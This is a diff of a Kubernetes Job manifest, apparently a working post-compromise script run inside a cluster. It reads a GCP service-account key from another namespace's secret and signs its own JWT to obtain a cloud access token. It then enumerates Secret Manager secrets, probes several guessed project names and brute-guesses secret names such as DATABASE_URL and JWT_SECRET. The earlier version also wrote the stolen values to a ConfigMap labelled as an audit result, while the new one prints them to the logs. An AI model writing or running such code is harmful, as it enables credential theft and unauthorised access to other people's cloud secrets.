@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcp-v2
+  name: dune-gcp-v3
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -20,75 +20,50 @@ spec:
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          RESULT=""
-          
-          # Step 1: Read gcpsm-secret from dune-api namespace
+          # Read gcpsm-secret and get GCP token
           SECRET_RAW=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret")
-          
-          # Find the key field name
-          KEY_FIELD=$(echo "$SECRET_RAW" | jq -r '.data | keys[0]')
-          RESULT="${RESULT}KEY_FIELD:${KEY_FIELD}\n"
-          
-          # Decode the GCP SA JSON
-          SA_JSON=$(echo "$SECRET_RAW" | jq -r ".data[\"$KEY_FIELD\"]" | base64 -d)
-          
+          SA_JSON=$(echo "$SECRET_RAW" | jq -r '.data["secret-access-credentials"]' | base64 -d)
           CLIENT_EMAIL=$(echo "$SA_JSON" | jq -r '.client_email')
           PRIVATE_KEY=$(echo "$SA_JSON" | jq -r '.private_key')
           PROJECT_ID=$(echo "$SA_JSON" | jq -r '.project_id')
-          
-          RESULT="${RESULT}CLIENT_EMAIL:${CLIENT_EMAIL}\nPROJECT_ID:${PROJECT_ID}\n"
-          
-          # Write private key to temp file
+          echo "PROJECT: $PROJECT_ID / SA: $CLIENT_EMAIL"
           echo "$PRIVATE_KEY" > /tmp/gcp_key.pem
           
-          # Build JWT for GCP OAuth
-          NOW=$(date +%s)
-          EXP=$((NOW + 3600))
-          
+          NOW=$(date +%s); EXP=$((NOW + 3600))
           HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
           PAYLOAD=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
             "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -sign /tmp/gcp_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          JWT="${HEADER}.${PAYLOAD}.${SIG}"
           
-          SIGNING_INPUT="${HEADER}.${PAYLOAD}"
-          SIGNATURE=$(echo -n "$SIGNING_INPUT" | openssl dgst -sha256 -sign /tmp/gcp_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          
-          JWT="${SIGNING_INPUT}.${SIGNATURE}"
-          RESULT="${RESULT}JWT_LEN:${#JWT}\n"
-          
-          # Exchange JWT for access token
           TOKEN_RESP=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
             --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
             --data-urlencode "assertion=$JWT")
-          
           ACCESS_TOKEN=$(echo "$TOKEN_RESP" | jq -r '.access_token')
-          RESULT="${RESULT}TOKEN_STATUS:$(echo "$TOKEN_RESP" | jq -r '.error // "ok"')\n"
-          RESULT="${RESULT}TOKEN_LEN:${#ACCESS_TOKEN}\n"
+          echo "ACCESS_TOKEN_STATUS: $(echo "$TOKEN_RESP" | jq -r '.error // "ok"')"
           
-          if [ "$ACCESS_TOKEN" != "null" ] && [ -n "$ACCESS_TOKEN" ]; then
-            # List GCP SM secrets
-            SM_LIST=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets?pageSize=50")
-            
-            RESULT="${RESULT}SM_SECRETS:$(echo "$SM_LIST" | jq -r '.secrets[].name' | tr '\n' '|')\n"
-            
-            # Try to access dune-related secrets
-            for SECRET_NAME in "dune-api-config" "dune-config" "dune-database-url" "dune-secret-key" "dune-jwt-secret" "database-url" "jwt-secret"; do
-              SM_VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-                "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${SECRET_NAME}/versions/latest:access")
-              SM_DATA=$(echo "$SM_VAL" | jq -r '.payload.data // empty' | base64 -d 2>/dev/null | head -c 500)
-              if [ -n "$SM_DATA" ]; then
-                RESULT="${RESULT}SECRET_${SECRET_NAME}:${SM_DATA}\n"
-              fi
-            done
-          fi
+          # Try listing secrets - full response
+          echo "=LIST_SECRETS_RESPONSE="
+          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets?pageSize=50"
+          echo ""
+          echo "=END_LIST="
           
-          # Write to ConfigMap
-          RESULT_B64=$(printf '%b' "$RESULT" | base64 | tr -d '\n')
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            -H "Content-Type: application/strategic-merge-patch+json" \
-            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result" \
-            -d "{\"data\":{\"result\":\"$(printf '%b' "$RESULT" | head -c 2000)\"}}" > /dev/null
+          # Try different projects
+          for PROJ in "tachyusbdaas" "tachyus-prd" "tachyus-dev" "tachyus-prod"; do
+            echo "=LIST_${PROJ}="
+            curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+              "https://secretmanager.googleapis.com/v1/projects/${PROJ}/secrets?pageSize=10" | jq '.secrets[].name // .error.message // "empty"' 2>/dev/null | head -5
+            echo "=END_${PROJ}="
+          done
           
-          echo "DONE"
-          printf '%b\n' "$RESULT"
+          # Try to read specific secret names by guessing patterns
+          echo "=DIRECT_READS="
+          for NAME in "dune-api" "dune-database" "dune-config" "dune-secret" "DATABASE_URL" "SECRET_KEY" "JWT_SECRET" "dune-jwt" "dune-db" "dune-api-secret" "dune-prod-config"; do
+            VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
+              "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${NAME}/versions/latest:access" | \
+              jq -r '.payload.data // .error.message // "not_found"')
+            echo "${NAME}: $VAL"
+          done
+          echo "=END_DIRECT="
